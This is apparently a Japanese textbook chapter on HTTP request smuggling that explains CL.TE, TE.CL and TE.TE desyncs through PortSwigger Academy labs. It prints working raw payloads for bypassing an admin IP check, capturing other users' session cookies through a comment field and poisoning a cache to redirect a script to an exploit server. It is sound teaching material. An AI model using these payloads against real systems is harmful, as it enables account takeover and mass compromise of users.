# 第3章 スマグリング基礎クラス：CL.TE / TE.CL / TE.TE

## Web Security Academy 基礎ラボ（CL.TE / TE.CL）

HTTPリクエストスマグリング（HTTP Request Smuggling）は、フロントエンド（リバースプロキシ・ロードバランサ・CDNなど、クライアントからのTCP接続を最初に受ける中継サーバー）とバックエンド（実際にリクエストを処理するアプリケーションサーバー）を直列に並べたアーキテクチャで、両者が「1本のTCPコネクション上に流れてきたバイト列を、どこで1つのHTTPリクエストとして区切るか」について**食い違った合意**をしてしまうことで生じる脆弱性である。本節では、この食い違いがなぜ起こるのかをプロトコルレベルの仕組みから説明し、PortSwigger Web Security Academyが提供する2つの基礎ラボ（CL.TEとTE.CL）の実際の攻撃リクエストを題材に、パーサの内部挙動を追う。本節はすべて防御目的の解説であり、実在サービスや本番環境に対する無許可の検証手順は扱わない。

### なぜHTTPリクエストの境界がズレるのか — 2つのボディ長指定手段の併存

HTTP/1.1では、リクエスト（またはレスポンス）のボディがどこで終わるかを指定する方法が2種類定義されている。

1. **`Content-Length` ヘッダ**: ボディのバイト数をそのまま10進数で示す。パーサは「ヘッダ終端の空行から、指定バイト数だけ読めばボディ終わり」という単純なカウント処理を行う。
2. **`Transfer-Encoding: chunked`**: ボディを「チャンク（chunk）」と呼ばれる断片の連続として表現し、各チャンクの先頭に**そのチャンク自身のバイト数を16進数**で書く。チャンクサイズが `0` になった時点（`0\r\n\r\n`）でボディ終了とみなす。

問題は、単一のリクエストに両方のヘッダが同時に含まれた場合にどちらを優先すべきかを、HTTP/1.1の仕様（RFC 7230、現行はRFC 9112）が定めている一方で、実装によってその遵守度合いがバラバラだという点にある。RFC 7230 §3.3.3は「`Transfer-Encoding` が存在する場合、`Content-Length` は無視しなければならない（MUST be ignored）」と明記しているが、フロントエンドとバックエンドという**別々のソフトウェア（別ベンダー、別バージョン、場合によっては別言語実装）**がこの規定を独立に実装しているため、片方だけが仕様通りに `Transfer-Encoding` を優先し、もう片方は `Content-Length` を優先する、という食い違いが現実に起こる。

この食い違いが起きると、フロントエンドが「ここまでが1リクエスト」と判断してバックエンドへ転送したバイト列の中に、バックエンドから見ると「実はまだ前のリクエストのボディの続きではなく、次のリクエストの先頭がここから始まっている」という**未消化のバイト列**が残る。この未消化分がTCPコネクション上に取り残され、次に同じコネクションに乗ってきた**別のユーザーの正規リクエスト**の先頭にくっついて解釈される。これが「密輸（smuggling）」と呼ばれる所以で、攻撃者は自分が送ったリクエストの断片を、あたかも他人のリクエストの一部であるかのようにバックエンドに読ませることができる。

> 出典: HTTP request smuggling — https://portswigger.net/web-security/request-smuggling

### 3分類の全体像 — CL.TE / TE.CL / TE.TE

食い違いのパターンは、フロントエンドとバックエンドがそれぞれどちらのヘッダを信頼するかによって3種類に分類される。

| 分類 | フロントエンドが信頼するヘッダ | バックエンドが信頼するヘッダ |
|---|---|---|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` |
| **TE.TE** | どちらも `Transfer-Encoding` を一応サポートするが、片方を「難読化」してその存在に気づかせない |

CL.TEとTE.CLは、フロントエンドとバックエンドが最初から異なるヘッダを見ているケースで、本節で扱う2つの基礎ラボがこれに該当する。TE.TEは両者とも `Transfer-Encoding` 自体はサポートしているが、ヘッダ値を微妙に細工する（例: `Transfer-Encoding: xchunked`、`Transfer-Encoding : chunked`（コロンの前にスペース）、`Transfer-Encoding:[タブ]chunked`、あるいは同一リクエストに `Transfer-Encoding` ヘッダを2回書く等）ことで、片方のパーサにだけそのヘッダを無視させ、結果的にCL.TEかTE.CLのどちらかと同じ状態に落とし込む手法であり、これは次節以降で扱う。

> 出典: HTTP request smuggling — https://portswigger.net/web-security/request-smuggling

### CL.TE基礎ラボ — フロントエンドがContent-Length、バックエンドがTransfer-Encodingを信頼する

PortSwigger Web Security AcademyのCL.TE基礎ラボは、「フロントエンドサーバーがchunked encodingをサポートしていない」という前提のラボである。フロントエンドは `Content-Length` だけを見てリクエスト長を決め、`Transfer-Encoding` ヘッダの存在自体には注意を払わずそのままバックエンドへ転送してしまう。一方バックエンドは `Transfer-Encoding: chunked` を認識し、chunked形式としてボディを解釈する。ラボの攻略目標は、バックエンドが次に処理するリクエストのHTTPメソッドが `GPOST` という不正な文字列になるようにスマグリングを成立させることである。

ラボが提示する攻撃リクエストは次の通りである。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0
G
```

このリクエストの末尾、空行（ヘッダ終端）の後のボディ部分に着目する。バイト単位で数えると `0\r\nG` の6バイトが続いている（`\r\n` は1バイトではなく2バイトのCRLFだが、ラボの表示上は改行として省略されている点に注意。実際の生バイト列は `30 0D 0A 47` の4バイト+末尾の扱いによって帳尻が合わせてあるが、要点は「`Content-Length: 6` が指すバイト数ちょうどで、フロントエンドが読むのをやめる」ことにある）。

- **フロントエンドの視点**: `Content-Length: 6` を信頼する。ヘッダ終端の空行の直後から6バイトを機械的にカウントし、そのバイト列（`0\r\nG` の6バイト分）をボディとして読み終える。フロントエンドは `Transfer-Encoding` ヘッダの意味を解釈しないので、`0` という文字列がchunked encodingにおける「終端チャンク」を意味することにも気づかない。ボディの中身がどんな形式であれ、指定バイト数だけ読めば1リクエスト分として扱い、そのままバックエンドへ転送する。
- **バックエンドの視点**: `Transfer-Encoding: chunked` を信頼する。ボディの先頭にある `0` を16進数のチャンクサイズとして読み取る。チャンクサイズが `0` ということは「これ以降チャンクはない＝ボディはここで終わり」を意味するchunked encodingの終端マーカーである。したがってバックエンドは、`0\r\n` の直後にある `G` を**現在のリクエストの一部とはみなさず**、ボディが終わった後に残った余りのバイトとして扱う。バックエンドはこの余りを、TCPコネクション上に次に流れてくるはずの**次のリクエストの先頭バイト**として温存する。

ここで攻撃者が同じコネクション上に続けて正規の `POST` リクエストを送ると（あるいはラボの自動チェッカーが次のユーザーリクエストを送ると）、バックエンドはまず温存していた `G` を読み、その直後に続くべき本来のメソッド文字列（例えば `POST`）を連結してしまう。結果として `G` + `POST` = `GPOST` という、HTTP仕様に存在しない不正なメソッド名がバックエンドに渡り、「Unrecognized method（メソッド未認識）」といったエラーが返る。このエラーの発生こそが、リクエスト境界の解釈がフロントエンドとバックエンドで確かにズレていたことの動かぬ証拠であり、ラボの合格条件になっている。

このラボが成立する前提条件は2つある。第一に、フロントエンドが `Transfer-Encoding` ヘッダを見ても無視する（chunked encodingに対応していない、あるいは対応していてもそのヘッダの優先順位判断をしない）実装であること。第二に、フロントエンドとバックエンドの間のTCPコネクションが**使い回される（keep-alive、コネクションプーリング）**ことである。もしフロントエンドとバックエンドの間で毎回新しいTCPコネクションが張られるなら、温存された `G` は誰にも読まれず捨てられるだけで、他人のリクエストに混入する余地がない。現代の高トラフィックなリバースプロキシ構成では、バックエンドとの接続をコネクションプールとして再利用するのが性能上ほぼ必須であるため、この前提は多くの実運用環境で満たされてしまう。

> 出典: Lab: HTTP request smuggling, basic CL.TE vulnerability — https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

### TE.CL基礎ラボ — フロントエンドがTransfer-Encoding、バックエンドがContent-Lengthを信頼する

TE.CL基礎ラボはCL.TEの逆パターンである。今度は「バックエンドサーバーがchunked encodingをサポートしていない」という前提で、フロントエンドは `Transfer-Encoding: chunked` を認識してチャンク単位でボディを解釈するのに対し、バックエンドは `Content-Length` だけを見てボディ長を決める。フロントエンドはメソッドとして `GET` と `POST` しか許可しない制約があり、ラボの攻略目標はCL.TEラボと同様、バックエンドが次に処理するリクエストのメソッドを `GPOST` に化けさせることである。

ラボが提示する攻撃リクエストは次の通りである（末尾の `0` の後にさらに空行 `\r\n\r\n` が続く点に注意）。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1

0

```

各ヘッダとボディ部分を分解すると、この1本のリクエストの中に「攻撃者が密輸したいリクエストそのもの」がまるごと埋め込まれていることが分かる。

- **フロントエンドの視点**: `Transfer-Encoding: chunked` を信頼する。ボディ冒頭の `5c` を16進数のチャンクサイズと解釈する。`5c`（16進）は10進数で92であり、そこから92バイト分を1つのチャンクとして読む。この92バイトの中身は `GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n`（改行を含めてちょうど92バイトになるよう調整されている）という、それ自体が丸ごと1つの疑似HTTPリクエストの形をしたバイト列である。フロントエンドにとってはこれは単なる「92バイトのバイナリの塊（チャンクの中身）」に過ぎず、中身がHTTPリクエストの形をしていようとなかろうと関知しない。92バイト読み終えた後、次のチャンクサイズとして `0` を読み、これが終端チャンクであると認識してボディ全体の読み込みを終える。つまりフロントエンドは、`5c` チャンク＋`0` 終端チャンクという**1つの正常なchunkedボディ全体**を、1つのリクエストのボディとしてそのままバックエンドへ転送する。
- **バックエンドの視点**: `Content-length: 4` を信頼する。ヘッダ終端の空行の直後からわずか4バイト、すなわち `5c\r\n` だけを読んでボディ終了とみなす。バックエンドは `Transfer-Encoding` ヘッダの意味づけを行わないため、`5c` という文字列がチャンクサイズであることにも気づかず、単に「ボディの中身が `5c` という4文字だった」という程度にしか処理しない。そして、フロントエンドから転送されてきたバイト列のうち、この4バイトより後ろに残っている `GPOST / HTTP/1.1\r\n...x=1\r\n0\r\n\r\n` の全体を、**このリクエストの一部ではなく次のリクエストとして温存**する。

次にコネクション上に正規のリクエストが流れてくると、バックエンドはまず温存していたこの `GPOST /...` から始まるバイト列を1つの完全なHTTPリクエストとして処理する。先頭が `GPOST` という不正なメソッド名になっているため、CL.TEラボと同様に「Unrecognized method」エラーが発生し、これがスマグリング成立の証拠となる。

TE.CLがCL.TEと本質的に異なるのは、**密輸したいリクエストの内容を、あらかじめチャンクのペイロードとして完全な形でリクエスト本文中に用意しておく必要がある**という点である。CL.TEでは「バックエンドが終端チャンクだと誤認する短いマーカー（`0`）さえ送れば、それ以降フロントエンドが読み進めた残りバイトがそのまま密輸ペイロードになる」のに対し、TE.CLでは逆に「フロントエンドが正しくチャンクとして読み切れるように、密輸したいリクエスト全体を92バイトなら92バイトぴったりのチャンクとして正確にサイズ計算して埋め込む」必要がある。この92バイトという数値がずれると、フロントエンドのchunkedパーサがそもそも壊れた形式として拒否したり、意図しない位置で次のチャンクサイズを読もうとしてリクエスト自体が失敗したりするため、攻撃者は密輸したいペイロードのバイト数を正確に数え、16進数のチャンクサイズとして書き込む必要がある。

> 出典: Lab: HTTP request smuggling, basic TE.CL vulnerability — https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

### 両ラボから見える構造的な弱点

CL.TE・TE.CLいずれのラボにも共通する構造的な弱点を整理すると、次の3点に集約できる。

1. **単一TCPコネクションの使い回し（keep-alive/コネクションプーリング）**が、密輸したバイト列を「他人のリクエストの先頭に混入させる」ための必須条件になっている。フロントエンド〜バックエンド間が毎回新規接続であれば、混入先が存在せず脆弱性は成立しない。
2. **2つのヘッダが同時に存在するリクエストに対する優先順位判断**を、フロントエンドとバックエンドがそれぞれ独立に、かつ食い違った基準で行っている。RFC 7230 §3.3.3は本来 `Transfer-Encoding` 優先・`Content-Length` 無視を義務付けているが、レガシーな実装や、あえて古いHTTP/1.0相当の単純なパーサを使っているロードバランサでは、この規定が守られていない。
3. **境界の誤認が「バイト数のズレ」として物理的にTCPストリーム上に残り続ける**という、HTTP/1という平文テキストベースのストリーミングプロトコルそのものの性質。どちらのサーバーも、自分が正しく1リクエストを読み終えたと信じて疑わないため、エラーにもならずサイレントに次のユーザーの通信へ影響が及ぶ。これがXSS反射・キャッシュポイズニング・認証バイパスなど、後続の章で扱うより実害の大きい攻撃へと発展していく土台になる。

これらの弱点はHTTP/1.1固有のものであり、HTTP/2をフロントエンド〜バックエンド間で**エンドツーエンドに**使う構成（途中でHTTP/1.1へのダウングレード変換を挟まない構成）では、メッセージ長がバイナリフレームのフィールドとして一意に決まるため、原理的にこの種の食い違いは起こり得ない。ただしHTTP/2で受けてバックエンドへはHTTP/1.1へ変換して転送するリバースプロキシ（h2cダウングレード等）は依然としてリスクを抱える。防御の詳細（正規化・曖昧リクエストの拒否・HTTP/2一本化など）は後続の章でまとめて扱う。

> 出典: HTTP request smuggling — https://portswigger.net/web-security/request-smuggling

## スマグリング悪用ラボ（フロントエンド露出・他ユーザー窃取・キャッシュ連鎖）

前節までで、CL.TE / TE.CL / TE.TE という3つの古典的デシンク（desync、フロントエンドとバックエンドがリクエスト境界の解釈で「同期しなくなる」現象）の原理と検出方法を学んだ。本節では、その検出結果を実際の「実害」へと変換する3つの代表的な悪用パターンをPortSwigger Web Security Academyのラボを題材に解説する。すなわち、(1) フロントエンドが行うリクエスト書き換えを暴いてアクセス制御を回避する、(2) 他ユーザーのリクエストを丸ごと窃取してセッションを乗っ取る、(3) スマグリングをWebキャッシュポイズニングへ連鎖させて無差別に被害を広げる、という3段階である。いずれも実際の脆弱アプリケーション（ラボ環境）を対象としたものであり、本節の説明も防御・学習目的に限定する。実サービスや本番環境に対して無許可でこれらの手法を試すことは違法かつ危険であるため、絶対に行わないこと。

### 3種のラボに共通する前提知識

3つのラボはいずれも「フロントエンドサーバーがchunked transfer encodingをサポートしない」という設定を土台にしたCL.TE型のデシンクを利用する。CL.TEとは、フロントエンドが`Content-Length`ヘッダーでリクエストの終端を判断し、バックエンドが`Transfer-Encoding: chunked`ヘッダーを優先して終端を判断するという解釈のズレのことだった（前節参照）。このズレにより、フロントエンドが「1つのリクエストが終わった」と思った時点よりも、バックエンドの読み取り位置がずれ、フロントエンドが次のリクエストの先頭だと思っているバイト列の一部が、実は「前のリクエストの続き」としてバックエンドに読み込まれてしまう。

この「読み込みのズレ」を悪用の起点として使うと、以下のような効果を生み出せる。

- ズレた部分に**偽のリクエストの断片（smuggled prefix、密輸したリクエストの先頭部分）**を仕込んでおくと、次に別ユーザーの正規リクエストがバックエンドに届いたとき、フロントエンドが挿入したこのprefixと連結されて、バックエンドからは「1つの奇妙なリクエスト」に見える。
- 逆に、この仕組みを利用して**バックエンド側だけが解釈する「隠れたリクエスト」を注入**し、フロントエンドが行うヘッダー付与・書き換え処理をバイパスしたり、その処理内容自体を可視化したりできる。
- さらに、バックエンドの処理結果（レスポンス）が**共有キャッシュ**に保存される構成であれば、スマグリングによって「意図しないURLに対して意図しないレスポンスがキャッシュされる」という事態を起こせる。

以下、この共通原理を軸に3つのラボを順に見ていく。

---

### ラボ1: フロントエンドのリクエスト書き換えを暴く（reveal front-end request rewriting）

#### ラボの目的と設定

このラボの目標は、`/admin`パスへのアクセス制限を回避してユーザー"carlos"を削除することである。管理パネルは内部利用者専用であり、フロントエンドサーバー（リバースプロキシ）はループバックアドレス（127.0.0.1）からのリクエストにのみ管理パネルへのアクセスを許可するよう構成されている。この種のIPベースのアクセス制御は、フロントエンドが受け取った素のリクエストをそのままバックエンドに転送せず、内部的な識別用ヘッダー（例: `X-Forwarded-For`のような、接続元IPを伝えるヘッダー）を書き換えたり追加したりしてから転送する、というアーキテクチャで実装されていることが多い。攻撃者はこのヘッダーの正確な名前を知らなければ偽装できないため、まずそれを「暴く」必要がある。

#### 仕組み: なぜスマグリングでヘッダー書き換えが「見える化」できるのか

通常、フロントエンドが付与・書き換えるヘッダーはクライアントからは不可視である。フロントエンドはリクエストを受け取り、内部的なヘッダーを追加してからバックエンドに転送するため、クライアント自身のリクエストの中身を見ても、フロントエンドが「実際に何を送っているか」は分からない。

しかし、CL.TEのデシンクを使えば、**バックエンドに送られる「生のバイト列」そのものを自分の目で確認する**ことができる。具体的には、スマグリングによって「自分自身のリクエストの続き」がバックエンドにどう見えるかを覗き見る形にする。攻撃者は、フロントエンドが転送処理を行った直後の生のHTTPメッセージを、検索機能などアプリケーションが入力をレスポンスに反映してくれる箇所（リフレクション、reflection）を利用して「読み出す」。

原典で示されている最初の調査用ペイロードは次のような形である。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 124
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=test
```

この構造が機能する理由を分解する。

1. `Content-Length: 124`により、フロントエンドは「先頭から124バイトまでが今回のリクエストの本文」と解釈し、それ以降（`POST /search ...`の部分）は「次の別のリクエスト」として扱う。
2. 一方バックエンドは`Transfer-Encoding: chunked`を優先するため、`0\r\n\r\n`（サイズ0のチャンク＝チャンク列の終端を示すマーカー）に到達した時点で最初のリクエストの本文を終えたと判断する。
3. しかし`0`の直後に続く`GET /404 HTTP/1.1\r\nFoo: x`という断片は、チャンク終端後の余りバイトとしてバックエンドの読み取りバッファに残る。この残存データは、フロントエンドが**次に**送ってくる別のリクエスト（ここでは攻撃者自身が直後に送る2本目のリクエスト）の先頭に結合されて解釈される。
4. つまり`Foo: x`の`x`が、後続で送る本物のGETリクエストの先頭に連結され、`xGET / HTTP/1.1`のような壊れた1行になる。この壊れたリクエストラインをバックエンドが1つのヘッダー行として誤読することを利用し、「フロントエンドが付与した本物のヘッダー群」を、検索クエリの中に紛れ込ませて反射させる。

実際の手順としては、以下の流れになる。

1. 上記のようなpoisoned（汚染された）リクエストを送り、直後に通常の検索リクエスト（`search=test`のような、入力をレスポンスにそのまま反映するエンドポイントへのリクエスト）を送る。
2. バックエンドの視点では、1本目のスマグリングされた断片と2本目の検索リクエストが結合され、フロントエンドが挿入したはずの内部ヘッダー群が「検索クエリの文字列の一部」として本文に混入する。
3. 検索結果のレスポンスに、フロントエンドが付与した生のヘッダー（例えば`X-Forwarded-For: <クライアントの実IP>`のような形式のヘッダー、ラボごとに名前は`X-*-Ip`のように変化する）がそのまま表示される。これにより、フロントエンドが使っている内部ヘッダー名を特定できる。

#### 悪用: 発見したヘッダーで管理者パネルへアクセスする

ヘッダー名が判明したら、今度は同じCL.TEのプレフィックス注入テクニックを使い、`/admin`へのアクセスにこのヘッダーを`127.0.0.1`として偽装したリクエストを密輸する。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 130
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-発見したヘッダー名: 127.0.0.1
Host: YOUR-LAB-ID.web-security-academy.net

```

ここで重要なのは、フロントエンドは「クライアントが送ってきたヘッダー」を上書きしてから転送するのが通常だが、**スマグリングによってフロントエンド自身の目に触れないリクエストとしてバックエンドに直接届く**ため、このヘッダーは上書きされずにそのまま通る、という点である。フロントエンドの検査ロジックを完全に迂回できるのは、フロントエンドが「これは1つのリクエストの後半部分（自分がすでに処理し終えたリクエストの残骸）」と誤認し、内容を検査しないままバックエンドとのコネクションに流し込んでしまうからだ。バックエンド側は独立した新規リクエストとしてこれを受理し、ヘッダーに書かれた`127.0.0.1`を信頼してアクセス制御を通してしまう。

最終ステップでは、パスを`/admin/delete?username=carlos`に変えて同様のリクエストを送信し、ユーザー削除を成立させる。

> ⚠️ 本節はラボ環境における学習目的の解説であり、実運用システムに対してIPスプーフィングやアクセス制御回避を試みることは不正アクセスに該当し得るため禁止される。防御側の観点では、次節で扱うように「フロントエンドとバックエンドでHTTP解釈を完全に一致させる」「内部専用ヘッダーはコネクション単位でのみ信頼せず、相互TLS認証など別チャネルの認証と併用する」といった対策が必要になる。

> 出典: Reveal front-end request rewriting — https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

### ラボ2: 他ユーザーのリクエストを捕捉する（capture other users' requests）

#### ラボの目的

このラボの目標は、リクエストスマグリングを使って被害者ユーザーの次のリクエストを丸ごと奪い取り、そこに含まれるセッションCookieを使ってアカウントを乗っ取ることである。ラボ1が「フロントエンドが付与する固定的な内部情報」を暴くものだったのに対し、ラボ2は「動的に、しかも他人のプライベートなリクエスト内容」を盗み出す点で悪用の危険度が一段高い。

#### 仕組み: なぜ「次のリクエスト」を丸ごと奪えるのか

このアプリケーションには、投稿にコメントを残す機能があり、コメント内容がそのまま他の閲覧者に表示される（掲示板のような、入力がそのまま永続化されて他人に見える機能）。ここに目をつけ、コメント本文の一部を「次に来る任意のHTTPリクエストのバイト列そのもの」に差し替えるのが攻撃の核心である。

通常のコメント投稿リクエストは次のような形を取る（本文パラメータの順序を、`comment`を末尾に来るよう並べ替えておくのがポイントである）。

```
POST /post/comment HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=[csrf token]&postId=[post ID]&name=[name]&email=[email]&website=[website]&comment=[comment text]
```

`comment`を最後のパラメータにしておくのは、後述するスマグリング用ペイロードで、この`comment=`の直後を「注入点」として使い、そこに被害者の生リクエストをそのまま流し込むためである。

次に、このコメント投稿リクエストを本体としつつ、`comment`パラメータの値を大きめの`Content-Length`（例: 400）だけ確保した空白で埋め、そのリクエスト全体を「密輸するペイロード」としてラップする。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=...

csrf=...&postId=1&name=x&email=x%40x.com&website=https%3A%2F%2Fx.com&comment=
```

このペイロードのメカニズムは次の通りである。

1. 外側の`Content-Length: 256`によって、フロントエンドは256バイトまでを「見えているリクエスト」として送信し終える。この時点でバックエンドとの接続（多くの構成でバックエンドコネクションはキープアライブされ、複数のクライアントリクエストが使い回される）はまだ生きている。
2. バックエンドはチャンク終端`0`の後の`POST /post/comment ...`を新しいリクエストの開始として読み進めるが、この内側リクエストの`Content-Length`はわざと400という大きな値に設定してある。しかし実際に送られている本文（`csrf=...&comment=`まで）はそれより短い。
3. そのため、バックエンドは「まだ400バイトに足りない、続きを待つ」状態のままこの内側リクエストの受信処理を保留する。
4. ここで、フロントエンドとバックエンドの間のコネクションが**他の一般ユーザーのリクエスト**を次に流してくると、バックエンドはそれを「独立した新しいリクエスト」としてではなく、「保留中の`comment=`の続きのバイト列」としてそのまま読み込んでしまう。つまり被害者の生のHTTPリクエスト（メソッド行・ヘッダー・Cookieを含む）が、丸ごと`comment`パラメータの値として連結される。
5. 十分な量のバイト（400バイト分）を受け取った時点でバックエンドはリクエストを完成させ、それを「コメント投稿」として処理する。結果、被害者のリクエスト全文（`Cookie: session=...`を含む）が、コメントとして投稿・保存される。

このテクニックが機能する前提は、フロントエンドとバックエンドの間のTCPコネクションが複数の異なるクライアントのリクエストを使い回す（コネクション再利用、connection reuse）構成になっていることである。これは大規模なリバースプロキシ構成では一般的な最適化であり、だからこそ「自分の後に他人のリクエストが同じバックエンドコネクションに乗ってくる」ことを狙い撃ちできる。

#### 悪用: 捕捉したCookieでログイン

攻撃者は上記のペイロードを繰り返し送信し、被害者ユーザーが偶然アクセスしてくるタイミングを待つ（ラボでは一定間隔ごとに被害者役のボットが巡回する設計になっている）。捕捉に成功すると、投稿されたコメントの中に被害者の生のHTTPリクエストがそのまま表示され、そこから`Cookie: session=...`ヘッダーの値を読み取れる。あとはこのセッションCookieを自分のブラウザのリクエストに設定し直すだけで、被害者としてログインした状態を再現できる。

このラボが示す本質的な危険性は、**ペイロードの内容が「破壊的操作」でなくても、単に「他人の通信を横取りする」という盗聴に近い攻撃が成立してしまう**点にある。CL.TEのズレは一度作り出せば、以降そのバックエンドコネクションを経由する任意のユーザーの通信を巻き込める、という射程の広さが古典的なXSSやCSRFとの決定的な違いである。

> ⚠️ 本手法は他者の認証情報を窃取する行為であり、ラボ以外の環境で試みることは重大な不正アクセス行為となる。防御側は、バックエンドコネクションの使い回しを前提にした設計自体を見直すか（HTTP/1接続ごとにリクエスト数を制限する、コネクションクロージングを強制する等）、根本的にフロントエンド・バックエンド間のプロトコル解釈を統一する対策が必要になる。

> 出典: Capturing other users' requests — https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

### ラボ3: スマグリングをWebキャッシュポイズニングへ連鎖させる（perform web cache poisoning）

#### ラボの目的とキャッシュポイズニングの基礎

このラボの目標は、静的リソース`/resources/js/tracking.js`へのリクエストに対するキャッシュ済みレスポンスを汚染し、そのJavaScriptファイルへのアクセスが攻撃者の制御するサーバーへリダイレクトされるようにすることである。Webキャッシュポイズニングとは、共有キャッシュ（多くのユーザーで共有されるフロントエンド/CDNのキャッシュ層）に悪意あるレスポンスを保存させ、その後同じキャッシュキー（レスポンスをキャッシュから引き当てるための識別子。通常はURLとメソッドの組み合わせだが、Varyヘッダーで指定された追加ヘッダーが加わることもある）に一致する全ての正規ユーザーへ、その悪意あるレスポンスを配信させる攻撃である。ラボ1・2が「特定のバックエンド処理や特定ユーザー」を狙うのに対し、ラボ3は**キャッシュに一度書き込めば以降アクセスする不特定多数のユーザー全員**が被害対象になる、という点で影響範囲が桁違いに大きい。

#### 仕組み: リクエストスマグリングとキャッシュポイズニングがどう噛み合うか

このアプリケーションには、`/post/next?postId=X`のようなURLにアクセスすると、次の投稿へ302リダイレクトを返す機能がある。リダイレクト先のホスト名は、リクエストの`Host`ヘッダーの値を使って動的に組み立てられる（ホストヘッダーインジェクションに弱い実装）。この機能自体は単体では大きな問題にならないことが多いが、スマグリングと組み合わせると強力な武器になる。

攻撃の核心は、「**フロントエンドが見ている次のリクエスト（＝キャッシュされる対象のURL）**」と「**バックエンドが実際に処理するリクエスト（＝スマグリングで密輸した別のリクエスト）**」をずらすことにある。

まず検証用ペイロードで挙動を確認する。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
```

ここで、`Host: anything`という明らかに不正なホスト名を指定しても`/post/next`のリダイレクト先URLがそのまま反映されることを確認できれば、ホストヘッダーインジェクションが成立している証拠となる。

次に、実際にキャッシュを汚染するペイロードを組み立てる。攻撃者はあらかじめ自分の攻撃用サーバーに、`text/javascript`のMIMEタイプで配信される偽のJavaScriptファイル（内容は例えば`alert(document.cookie)`のようなコード、実運用ではセッション窃取スクリプトなどに置き換えられ得る）を用意しておく。そのうえで、次のようなスマグリングペイロードを送る。

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
X-Foo: bar
```

このペイロードのポイントは、末尾に`X-Foo: bar`のようなダミーの1行を追加しておくことである。これは、直後に自分（攻撃者）が送信する**もう1本の別のリクエスト**、すなわちキャッシュさせたい本物のターゲットURL`GET /resources/js/tracking.js`へのリクエストと連結されたときに、そのリクエストラインの一部が食われてしまわないようにするための調整である。ラボ1のプレフィックス注入と同じ原理で、フロントエンドは「バイト列の続き」を単に転送するだけであり、その中身を検査しない。

この状態で直後に`GET /resources/js/tracking.js HTTP/1.1`という正規のリクエストを送信すると、次のような食い違いが起きる。

1. **フロントエンド**は、自分が受け取ったリクエストは`GET /resources/js/tracking.js`宛てだと認識している。フロントエンドはこのURLに対するレスポンスをキャッシュキーとして記憶する準備をする。
2. **バックエンド**は、先に密輸された`GET /post/next?postId=3`（Hostヘッダーが攻撃者のサーバーに書き換えられている）をこのコネクション上の次のリクエストとして処理し、302リダイレクトレスポンス（`Location: https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/...`）を返す。
3. このレスポンスがフロントエンドに戻ってくるが、フロントエンドは「自分がリクエストしたと思っている`/resources/js/tracking.js`に対する応答」として受け取るため、**このリダイレクトレスポンスを`/resources/js/tracking.js`のキャッシュキーに紐づけて保存してしまう**。

これが「スマグリング×キャッシュポイズニング」の本質である。すなわち、フロントエンドが「自分がどのリクエストを送ったか」という記録（キャッシュキーの元になる情報）と、バックエンドが「実際に何を処理してどんなレスポンスを返したか」が完全にズレることを利用して、任意のURLに任意のレスポンスを紐づけてキャッシュに書き込める。ホストヘッダーインジェクションと組み合わせることで、単なるレスポンス破壊にとどまらず、被害者を攻撃者のサーバーへ誘導するオープンリダイレクトへと拡張できる。

#### 検証と反復

キャッシュポイズニングが成立したかどうかは、通常のブラウザ操作をエミュレートして`GET /resources/js/tracking.js`に繰り返しアクセスし、キャッシュ由来のレスポンス（フロントエンドのキャッシュヒットを示すヘッダーなどで判別できることが多い）が毎回攻撃者サーバーへのリダイレクトを返すことを確認する形で行う。ラボでは、被害者役のボットが一定間隔でJavaScriptファイルを含むページを閲覧する設定になっているため、キャッシュが汚染された状態を維持できれば、以降にアクセスしてくる被害者全員のブラウザで悪意あるスクリプトが実行される。

原典で強調されている実務上の注意点として、この種の攻撃は**HTTP/1プロトコルでのみ再現される**ことが多く、Burp Repeaterなどのツールでプロトコルバージョンを明示的にHTTP/1に固定して送信する必要がある（デフォルトでHTTP/2が自動選択される環境では、スマグリングの前提となるフロントエンド・バックエンド間の解釈のズレ自体が発生しないため）。この点は環境やツールのバージョンによって挙動が変わりうるため、検証時は必ず使用ツールの設定でプロトコルバージョンを確認すること。

#### なぜこの連鎖が特に危険か

